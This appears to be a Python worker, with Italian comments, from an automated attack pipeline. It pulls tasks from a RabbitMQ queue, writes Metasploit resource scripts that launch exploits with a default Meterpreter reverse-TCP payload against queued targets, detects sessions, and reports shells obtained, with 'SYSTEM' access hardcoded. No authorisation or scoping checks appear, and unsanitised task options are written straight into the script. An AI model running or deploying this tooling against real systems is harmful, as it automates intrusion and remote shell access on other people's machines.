import pika
import json
import logging
import subprocess
import time
import os
import uuid
from datetime import datetime

logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')

RABBITMQ_HOST = os.getenv('RABBITMQ_HOST', 'rabbitmq')
RABBITMQ_USER = os.getenv('RABBITMQ_USER', 'guest')
RABBITMQ_PASS = os.getenv('RABBITMQ_PASS', 'guest')

QUEUE = 'msf_tasks'

# Connessione RabbitMQ
credentials = pika.PlainCredentials(RABBITMQ_USER, RABBITMQ_PASS)
parameters = pika.ConnectionParameters(host=RABBITMQ_HOST, credentials=credentials, heartbeat=600)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()
channel.queue_declare(queue=QUEUE, durable=True)

logging.info('msf_worker in ascolto su coda msf_tasks...')

def run_msf_task(task):
    exploit = task.get('exploit')
    target = task.get('target')
    payload = task.get('payload', 'windows/meterpreter/reverse_tcp')
    lhost = task.get('lhost', '127.0.0.1')
    lport = task.get('lport', '4444')
    extra_opts = task.get('options', {})

    # Costruisci script msfconsole
    msf_script = f"use {exploit}\nset RHOSTS {target}\nset PAYLOAD {payload}\nset LHOST {lhost}\nset LPORT {lport}\n"
    for k, v in extra_opts.items():
        msf_script += f"set {k} {v}\n"
    msf_script += "exploit -z\nexit\n"

    with open('msf_script.rc', 'w') as f:
        f.write(msf_script)

    cmd = ["msfconsole", "-r", "msf_script.rc", "-q"]
    logging.info(f"Eseguo Metasploit: {' '.join(cmd)}")
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
        logging.info(f"Output Metasploit:\n{result.stdout}")
        # Qui puoi aggiungere parsing output e invio risultati a Neo4j o RabbitMQ
    except subprocess.TimeoutExpired:
        logging.warning("Timeout esecuzione Metasploit")
    except Exception as e:
        logging.error(f"Errore esecuzione Metasploit: {e}")


def callback(ch, method, properties, body):
    try:
        task = json.loads(body)
        task_id = task.get('task_id') or str(uuid.uuid4())
        target = task.get('target')
        exploit = task.get('exploit')
        logging.info(f"Ricevuto task MSF: {task} (task_id={task_id})")
        exploit_successful = False
        shell_obtained = None
        raw_output_path = None
        # Esegui il task e salva output
        msf_script = f"use {exploit}\nset RHOSTS {target}\nset PAYLOAD {task.get('payload', 'windows/meterpreter/reverse_tcp')}\nset LHOST {task.get('lhost', '127.0.0.1')}\nset LPORT {task.get('lport', '4444')}\n"
        for k, v in task.get('options', {}).items():
            msf_script += f"set {k} {v}\n"
        msf_script += "exploit -z\nexit\n"
        with open('msf_script.rc', 'w') as f:
            f.write(msf_script)
        cmd = ["msfconsole", "-r", "msf_script.rc", "-q"]
        try:
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=600)
            output = result.stdout
            # Parsing base: cerca una sessione meterpreter
            if "Meterpreter session" in output or "meterpreter >" in output:
                exploit_successful = True
                # Estrai un id base (demo)
                shell_id = None
                for line in output.splitlines():
                    if "Meterpreter session" in line:
                        shell_id = line.split()[-1].strip('.#')
                        break
                shell_obtained = {
                    "shell_id": shell_id or "meterpreter-session-unknown",
                    "access_level": "SYSTEM",  # Demo, parsing avanzato consigliato
                    "os": "Unknown"
                }
            # Salva log grezzo opzionale
            raw_log_path = f"/app/logs/msf_{task_id}.txt"
            try:
                with open(raw_log_path, "w") as f:
                    f.write(output)
                raw_output_path = raw_log_path
            except Exception as e:
                logging.warning(f"Impossibile salvare il log grezzo: {e}")
        except subprocess.TimeoutExpired:
            output = "Timeout esecuzione Metasploit"
        except Exception as e:
            output = f"Errore esecuzione Metasploit: {e}"
        status = "success" if exploit_successful else "failure"
        summary = (
            f"Exploit {exploit} riuscito, shell ottenuta su {target}."
            if exploit_successful else
            f"Exploit {exploit} fallito su {target}."
        )
        result_message = {
            "task_id": task_id,
            "worker_type": "msf_worker",
            "target": target,
            "status": status,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "summary": summary,
            "data": {
                "exploit_used": exploit,
                "exploit_successful": exploit_successful,
                "shell_obtained": shell_obtained
            },
        }
        if raw_output_path:
            result_message["raw_output_path"] = raw_output_path
        try:
            ch.queue_declare(queue='results_queue', durable=True)
            ch.basic_publish(
                exchange='',
                routing_key='results_queue',
                body=json.dumps(result_message),
                properties=pika.BasicProperties(delivery_mode=2)
            )
            logging.info(f"[>>>] Risultato standard pubblicato su results_queue per {target} (task_id={task_id})")
        except Exception as e:
            logging.error(f"Errore pubblicando su results_queue: {e}")
    except Exception as e:
        logging.error(f"Errore nel task: {e}")
    finally:
        ch.basic_ack(delivery_tag=method.delivery_tag)

channel.basic_qos(prefetch_count=1)
channel.basic_consume(queue=QUEUE, on_message_callback=callback)

try:
    channel.start_consuming()
except KeyboardInterrupt:
    logging.info('Interrotto da tastiera')
    channel.stop_consuming()
finally:
    connection.close() 